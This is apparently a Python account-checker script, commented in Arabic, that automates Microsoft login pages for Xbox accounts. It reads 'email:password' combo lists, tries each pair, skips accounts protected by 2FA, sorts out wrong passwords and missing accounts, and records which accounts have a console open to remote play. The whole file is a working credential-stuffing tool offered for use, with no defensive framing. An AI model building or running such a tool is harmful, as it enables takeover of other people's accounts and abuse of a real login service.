# xbox_checker.py
import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 90000  # زيادة المهلة إلى 90 ثانية

async def handle_password_entry(page, password: str) -> bool:
    """إدخال كلمة المرور مع انتظار ظهور الحقل بعدة طرق."""
    try:
        # انتظار ظهور أي حقل إدخال لكلمة المرور
        await page.wait_for_selector("input[type='password']", timeout=15000)
        await page.fill("input[type='password']", password)
        await asyncio.sleep(2)
        # النقر على زر تسجيل الدخول
        submit_buttons = [
            "input[type='submit']",
            "button[type='submit']",
            "button:has-text('Sign in')",
            "button:has-text('تسجيل الدخول')"
        ]
        for selector in submit_buttons:
            if await page.locator(selector).count() > 0:
                await page.click(selector)
                return True
        # إذا لم نجد زراً، نحاول الضغط على Enter
        await page.keyboard.press("Enter")
        return True
    except Exception as e:
        return False

async def check_2fa_or_other_challenges(page) -> bool:
    """التحقق مما إذا كانت الصفحة تطلب رمز تحقق (2FA) أو أي تحدي آخر."""
    body_text = await page.inner_text('body')
    lower_text = body_text.lower()
    if any(phrase in lower_text for phrase in ["enter code", "verification code", "authenticator", "code", "تحقق", "رمز", "تطبيق مصادقة"]):
        return True
    # فحص وجود عناصر محددة لطلب الرمز
    if await page.locator("input[id*='code']").count() > 0 or await page.locator("input[name*='code']").count() > 0:
        return True
    return False

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    """التحقق من وجود جهاز Xbox بعد تسجيل الدخول بنجاح."""
    console_url = "https://www.xbox.com/en-US/play/consoles"
    for attempt in range(3):
        try:
            await page.goto(console_url, timeout=60000)
            await page.wait_for_load_state("networkidle")
            await asyncio.sleep(3)
            text = (await page.inner_text('body')).lower()
            if "play your console remotely" in text:
                return True, "يوجد جهاز (يمكن اللعب عن بعد)", True
            if "set up your console" in text:
                return False, "مسجل ولا يوجد جهاز", True
            if "sign in to finish setting up" in text:
                return False, "تسجيل دخول غير مكتمل", False
            # إذا كان هناك رسالة خطأ مثل "كلمة مرور خاطئة" أو "الحساب غير موجود"
            if "incorrect password" in text or "wrong password" in text:
                return False, "كلمة مرور خاطئة", False
            if "account doesn't exist" in text or "couldn't find" in text:
                return False, "الحساب غير موجود", False
        except Exception:
            continue
    return False, "لم يتم العثور على جهاز", False

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',  # مهم لـ Railway
                '--disable-gpu'
            ]
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = await context.new_page()
        
        # الذهاب إلى صفحة تسجيل الدخول إلى Xbox
        await page.goto("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&ct=1700000000&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.xbox.com%2fen-US%2fplay%2fconsoles&id=292540", timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")
        
        # إدخال البريد الإلكتروني
        email_input = await page.wait_for_selector("input[type='email']", timeout=15000)
        await email_input.fill(account['email'])
        await asyncio.sleep(2)
        
        # النقر على زر "Next"
        next_button = await page.wait_for_selector("input[type='submit']", timeout=10000)
        await next_button.click()
        await page.wait_for_load_state("networkidle")
        
        # الانتظار لظهور حقل كلمة المرور أو أي تحدي
        await asyncio.sleep(3)
        
        # التحقق مما إذا كان هناك طلب رمز 2FA
        if await check_2fa_or_other_challenges(page):
            result['console_info'] = "يتطلب رمز تحقق (2FA) - تم التخطي"
            await browser.close()
            await p.stop()
            return result
        
        # إدخال كلمة المرور
        if not await handle_password_entry(page, account['password']):
            result['console_info'] = "فشل في إدخال كلمة المرور أو عدم ظهور الحقل"
            await browser.close()
            await p.stop()
            return result
        
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(3)
        
        # التعامل مع نافذة "Stay signed in?" إذا ظهرت
        try:
            yes_button = await page.wait_for_selector("input[value='Yes']", timeout=5000)
            await yes_button.click()
        except:
            pass
        
        # بعد تسجيل الدخول، التحقق من وجود جهاز
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info
        
        await browser.close()
        await p.stop()
        
    except PlaywrightTimeoutError:
        result['console_info'] = "انتهت المهلة أثناء تسجيل الدخول"
        if p:
            await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:100]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
